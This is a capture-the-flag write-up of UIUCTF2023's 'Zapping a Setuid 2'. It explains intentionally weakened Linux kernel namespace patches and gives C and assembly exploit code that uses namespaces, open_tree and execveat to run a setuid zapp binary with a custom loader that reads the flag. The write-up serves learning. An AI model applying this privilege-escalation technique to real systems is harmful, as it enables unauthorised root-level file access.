# Zapping a Setuid 2

## Description

This is one of a four part challenge from UIUCTF2023, it revolves around the [zapp](https://zapps.app/) binary format and Linux namespaces. I chose this challenge out of the four, because it is the one I spent the most time with, and, even though I haven't solved it, I learnt a lot about namespaces and had much fun with them.

Disclaimer: before this challenge, I knew little to nothing about namespaces, my knowledge and understanding of them is small and raw, so, pardon me if I had made any mistake.

## Overview

Let's begin this adventure.

### Zapp binaries

Zapp binaries are *zero-dependency applications*, this means that they are shipped with all the required libraries and the loader, but, unlike normal ELFs, the libraries are searched relative to the binary path, instead of a default location like `/usr/lib`. I'm not gonna discuss why it might be useful, if you are interested, check out [their explanations](https://zapps.app/technology/).

In the *Zapping a Setuid* challenges, we have a suid zapp binary, with nothing interesting on it, nothing that can be "normally" pwned. So we need to exploit the peculiarity of the zapp format. You might rightfully think that it is sufficient to create a symlink to the binary in a controlled folder, place the loader in the correct path relative to the symlink and achieve arbitrary code execution. Unfortunately, zapp resolves links before searching for libraries, thus, symlinks are out of the game.

In *Zapping a Setuid 1* we have `sysctl -w fs.protected_hardlinks=0` run. Hard links, by default, do not preserve the suid bit, but if this protection is removed, they do. So, for the first challenge, we can create a hard link to the binary in the home directory, place a custom loader that just reads the flag in the same directory (where the binary will search for it) and get the first flag. In the second part, we have `sysctl -w fs.protected_hardlinks=1`, so, no hard links with suid, but the challenge runs on a patched kernel.

### Kernel patches

We are given three git diff (plus a useless one to suppress a warning message).
```diff
Subject: [PATCH] fs/namespace: Allow unpriv OPEN_TREE_CLONE

OPEN_TREE_CLONE is only really useful when you could use move_mount()
to perform a bind mount. Otherwise all you get is an fd equivalent to
an O_PATH'ed fd that is detached, without a way to modify any
mountpoints of the current namespace.

What could possibly go wrong?

diff --git a/fs/namespace.c b/fs/namespace.c
index df137ba19d37..4f520f800dbc 100644
--- a/fs/namespace.c
+++ b/fs/namespace.c
@@ -2527,9 +2527,6 @@ SYSCALL_DEFINE3(open_tree, int, dfd, const char __user *, filename, unsigned, fl
        if (flags & AT_EMPTY_PATH)
                lookup_flags |= LOOKUP_EMPTY;

-       if (detached && !may_mount())
-               return -EPERM;
-
        fd = get_unused_fd_flags(flags & O_CLOEXEC);
        if (fd < 0)
                return fd;
```
The first patched is on the `open_tree` syscall. Have you ever heard about it? Me neither. Well, let's look at the man page.
```
$ man open_tree
No manual entry for open_tree
```
Crap! That's annoying! Luckily the man page [exists](https://lwn.net/Articles/802095/), it is just not in the official releases, I don't know why. To look at it in a nice why, apply the diff in the article to an empty git repo and copy the `open_tree.2` file `/usr/share/man/man2/` (you can also gzip it, but it is not necessary); the `move_mount` will not be used for this challenge even if the two syscalls are strictly related. After that you should have a beautiful `man open_tree` output.

This system call allow us to attach and clone mount points to file descriptors. The patch means that we can clone (open a detached) mount object even [without having `CAP_SYS_ADMIN`](https://elixir.bootlin.com/linux/v6.3.8/source/fs/namespace.c#L1765) in the current user namespace, and we can do this by passing the `OPEN_TREE_CLONE` flag. As the commit message says, we cannot do much with this, since we will need to move the mounted object in order to achieve something, for example move a mount of the `build` directory (where the binary is located) into a controlled one.

```diff
Subject: [PATCH] fs/namespace: Allow generic loopback mount without requiring
 nsfs

The argument was flawed and was never agreed upon [1].

After 18 years, what could possibly go wrong?

[1] https://lore.kernel.org/all/1131563299.5400.392.camel@localhost/T/#t

diff --git a/fs/namespace.c b/fs/namespace.c
index 4f520f800dbc..eb196f016e3f 100644
--- a/fs/namespace.c
+++ b/fs/namespace.c
@@ -2396,9 +2396,6 @@ static struct mount *__do_loopback(struct path *old_path, int recurse)
    if (IS_MNT_UNBINDABLE(old))
        return mnt;

-   if (!check_mnt(old) && old_path->dentry->d_op != &ns_dentry_operations)
-       return mnt;
-
    if (!recurse && has_locked_children(old, old_path->dentry))
        return mnt;
```

This patch modify the [`__do_loopback`](https://elixir.bootlin.com/linux/v6.3.8/source/fs/namespace.c#L2394) function. Reading again the `open_tree` syscall, we notice that it calls [`open_detached_copy`](https://elixir.bootlin.com/linux/v6.3.8/source/fs/namespace.c#L2544) which calls [`__do_loopback`](https://elixir.bootlin.com/linux/v6.3.8/source/fs/namespace.c#L2478). Again this happens only if we set the `OPEN_TREE_CLONE` flag. [`check_mnt`](https://elixir.bootlin.com/linux/v6.3.8/source/fs/namespace.c#L847) controls that the mount namespace of the mount object to be cloned is the same of the caller, from my understanding this prevent mount objects to affect higher privileges mount namespaces, and it is stated [here](https://man7.org/linux/man-pages/man7/mount_namespaces.7.html) (near the end of the page: "Restrictions on mount namespaces", point [2]) that it should not be possible (with `CAP_SYS_ADMIN` we could move mounts, so, we could make it happen, but we don't have that capability). With this check removed, we can create a mount in a newly created mount namespace where we have full capabilities, and open it in the parent process. I have no clue what the second removed check does. I have not found any documentation and the whole code for the entire function has been written in a single [commit](https://github.com/torvalds/linux/blame/master/fs/namespace.c#L2575) four years ago and it has not been touched ever since. From [this comment](https://elixir.bootlin.com/linux/v6.3.8/source/fs/namespace.c#L1849) we might be able to understand a bit more, but I'm still not sure at all.

We should be done, right? We can mount the `build` folder in the home from a cloned process with a new mount namespace, send the mounted root to the parent process, open it from there with `open_tree` and execute the binary relative to the opened folder. This should cause the binary to be executed from its less privileged mount namespace, but make him search the libraries in the parent mount namespace, in the home directory, exactly like an hard link. Suddenly (or fortunately) Linux is not that stupid and before executing a suid binary, it checks if the user and mount namespace of the caller is the same of the executed file. But that's where the third patch comes in handy.

```diff
Subject: [PATCH] fs/namespace: Check userns instead of mntns in mnt_may_suid

If we are in the same userns, I don't see why we need to check
if we are in the same mntns too, right?

--- a/fs/namespace.c
+++ b/fs/namespace.c
@@ -4609,7 +4609,8 @@ bool mnt_may_suid(struct vfsmount *mnt)
     * suid/sgid bits, file caps, or security labels that originate
     * in other namespaces.
     */
-   return !(mnt->mnt_flags & MNT_NOSUID) && check_mnt(real_mount(mnt)) &&
+   return !(mnt->mnt_flags & MNT_NOSUID) &&
+          current_in_userns(real_mount(mnt)->mnt_ns->user_ns) &&
           current_in_userns(mnt->mnt_sb->s_user_ns);
 }
```

Even without understanding the code, we can read the commit message: we don't need to be in the same user and mount namespace of the process that mounted the file / folder, but just in the same user namespace. Ok, but to be able to perform mounts, we need to have `CAP_SYS_ADMIN`, thus be in a new user namespace. This is not a problem, because when we send the file descriptor of the mount object from a process to another, this object carry only the mount namespace information and the user namespace becomes the one of the parent.

And that's all we need.

## Exploit

First thing we have to create a child with a new mount namespace and a new user namespace in order to perform mounts.
```c
void* stack = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK | MAP_GROWSDOWN, -1, 0);
pid_t child = clone(child_fun, stack + 0x100000 - 0x100, CLONE_NEWUSER | CLONE_NEWNS, NULL);
```

In the child function we mount the `build` directory on the home directory.
```c
mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL);
mount("/usr/lib/zapps/build", "/home/user", NULL, MS_BIND, NULL);
```
The first call is not necessary, but it is good practice to always use it when creating new mount namespace, in order to set it as slave of the parent.

Now we have to send the mounted directory to the parent process. We cannot directly send the home directory, but we need to send the root directory, otherwise the relative paths will not be resolved in the correct way. To send it we can use a socket pair and send the file descriptor of the opened root directory.

In the parent:
```c
int sock_pair[2];
socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, sock_pair);

pid_t child = CHECK(clone(child_fun, stack + 0x100000 - 0x100, CLONE_NEWUSER | CLONE_NEWNS, (void*)(long)sock_pair[0]));

int root_fd = recv_fd(sock_pair[1]);
```
In the child:
```c
int child_fun(void* args)
{
	int sock = (long)args;
	mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL);
	mount("/usr/lib/zapps/build", "/home/user", NULL, MS_BIND, NULL);

	int fd = open("/", O_PATH);

	send_fd(sock, fd);
	pause();
	return 0;
}
```
The pause before the return in child is necessary, otherwise the child process will be killed before the parent has the ability to do anything with the sent file descriptor because the file descriptors of the process are closed and the mounts unmounted. For the `send_fd` and `recv_fd` functions, I just copied them from [here](https://stackoverflow.com/questions/28003921/sending-file-descriptor-by-linux-socket).

Finally we have the root of the child mount namespace in the parent process, normally we couldn't do anything with it, but here we can clone it with the `open_tree` syscall.

```c
int fd = syscall(SYS_open_tree, root_fd, "", AT_EMPTY_PATH | AT_RECURSIVE | OPEN_TREE_CLONE);
```
We also need the `AT_RECURSIVE` flag, this is necessary, because we don't want to clone only the root mount, but also the build - home mount, and that flag is used to clone the whole mount subtree.

Finally we can call `execveat` on that file descriptor to make the magic happen. This will execute the binary with the suid, without dropping it because of the third patch, but will make him think it is located in the home directory where we can place out custom loader.

```c
syscall(SYS_execveat, fd, "home/user/exe", NULL, NULL, 0);
```

The loader cannot have any dependency, because it is a loader, so no main or libc functions. Mine is:
```c
// gcc -o ld-linux-x86-64.so.2 ld.s -nostdlib -nolibc -static
.intel_syntax noprefix
.global _start

.text
_start:
	// open("/mnt/flag", O_RDONLY, 0)
	lea rdi, [rip + path]
	mov rsi, 0
	mov rdx, 0
	mov rax, 2
	syscall

	// sendfile(STDOUT_FILENO, fd, 0, 0x50)
	mov rdi, 1
	mov rsi, rax
	mov rdx, 0
	mov r10, 0x50
	mov rax, 0x28
	syscall

	// exit(0)
	mov rdi, 0
	mov rax, 0x3c
	syscall

	path: .string "/mnt/flag"
```

By running the [exploit](exploit.c) we can finally get the flag `uiuctf{is-kernel-being-overly-cautious-5ba2e5c4}`

## Conclusions

I loved these challenges, I always like so much challenges with more parts, it is really nice to be able to reuse previously discovered stuff in new fun ways. Even if I wasn't able to solve this part during the CTF, I learnt **a lot** of stuffs reading source code and documentation and i learnt even more by looking at the author's exploit and by trying to understand every single bit of it.

Thank you a lot `@YiFei Zhu` for the amazing challenges and learning opportunities!
